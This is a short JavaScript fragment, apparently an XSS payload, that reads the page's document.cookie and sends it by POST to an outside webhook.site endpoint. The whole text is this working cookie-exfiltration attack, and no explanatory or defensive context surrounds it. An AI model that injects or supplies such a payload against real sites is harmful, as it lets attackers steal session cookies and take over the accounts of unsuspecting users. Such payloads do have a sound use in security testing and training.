        a = document.cookie;
        fetch('https://webhook.site/99d4d679-41d2-4eec-b185-acecfa39550c', {
        method: 'POST',
        body: 'data=' + a,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        });